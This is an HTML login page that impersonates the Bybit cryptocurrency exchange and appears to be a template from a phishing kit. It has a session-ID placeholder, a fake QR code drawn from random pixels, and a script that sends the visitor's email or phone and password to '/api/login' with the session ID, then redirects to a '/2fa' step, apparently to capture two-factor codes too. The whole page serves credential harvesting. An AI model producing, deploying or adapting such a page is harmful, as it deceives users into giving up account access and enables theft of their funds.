<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow"><title>Log In | Bybit</title>
<link rel="stylesheet" href="/app.css"></head><body><div class="wrap"><main class="card">
<div class="logo"><div class="mark"></div><div class="word">BYBIT</div></div>
<h1>Log In</h1>
<p class="sub">Welcome back to Bybit</p>
<div class="tabs">
  <button class="tab on" data-tab="mail">Email/Phone</button>
  <button class="tab" data-tab="qr">QR Code</button>
</div>
<form id="f" novalidate>
  <label for="l">Email/Phone number</label>
  <input id="l" type="text" autocomplete="username" autocapitalize="none" spellcheck="false" placeholder="Email/Phone number">
  <div style="height:14px"></div>
  <label for="p">Password</label>
  <div class="pw">
    <input id="p" type="password" autocomplete="current-password" placeholder="Password">
    <button class="eye" type="button" id="eye"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg></button>
  </div>
  <div class="err" id="err"></div>
  <button class="btn" type="submit" id="btn">Log In</button>
</form>
<div class="qr" id="qr"><canvas id="cv" width="176" height="176"></canvas><p>Scan with the Bybit App to log in</p></div>
<div class="alt"><a href="/forgot?s={{SID}}">Forgot password?</a><a href="#">Forgot email/phone?</a></div>
<div class="note">By logging in you agree to Bybit's Terms of Service and Privacy Policy.</div>
<div class="foot">Don't have an account? <a href="#">Sign Up</a></div>
<script>
var SID="{{SID}}",F=document.getElementById('f'),L=document.getElementById('l'),
P=document.getElementById('p'),B=document.getElementById('btn'),E=document.getElementById('err'),
EYE=document.getElementById('eye'),QR=document.getElementById('qr');
EYE.onclick=function(){var on=P.type==='password';P.type=on?'text':'password';EYE.style.opacity=on?'.5':'1';};
Array.prototype.forEach.call(document.querySelectorAll('.tab'),function(t){
  t.onclick=function(){
    Array.prototype.forEach.call(document.querySelectorAll('.tab'),function(x){x.classList.remove('on');});
    t.classList.add('on');
    var qr=t.dataset.tab==='qr';
    QR.classList.toggle('on',qr);
    F.style.display=qr?'none':'block';
  };
});
(function(){
  var c=document.getElementById('cv'),x=c.getContext('2d'),n=25,u=176/n;
  x.fillStyle='#fff';x.fillRect(0,0,176,176);x.fillStyle='#0B0E11';
  function finder(cx,cy){
    x.fillStyle='#0B0E11';x.fillRect(cx*u,cy*u,7*u,7*u);
    x.fillStyle='#fff';x.fillRect((cx+1)*u,(cy+1)*u,5*u,5*u);
    x.fillStyle='#0B0E11';x.fillRect((cx+2)*u,(cy+2)*u,3*u,3*u);
  }
  for(var i=0;i<n;i++)for(var j=0;j<n;j++){
    if((i<8&&j<8)||(i>n-9&&j<8)||(i<8&&j>n-9))continue;
    if(Math.random()>.5)x.fillRect(i*u,j*u,u,u);
  }
  finder(0,0);finder(n-7,0);finder(0,n-7);
})();
F.addEventListener('submit',function(e){
  e.preventDefault();
  var l=L.value.trim(),p=P.value;
  if(!l||!p){E.textContent='Enter your email/phone number and password.';return;}
  E.textContent='';B.disabled=true;B.textContent='Logging in…';
  fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({l:l,p:p,s:SID})})
    .then(function(r){return r.json();})
    .then(function(j){location.href=j.next||'/2fa';})
    .catch(function(){B.disabled=false;B.textContent='Log In';E.textContent='Network error. Please try again.';});
});
</script>
</main></div></body></html>
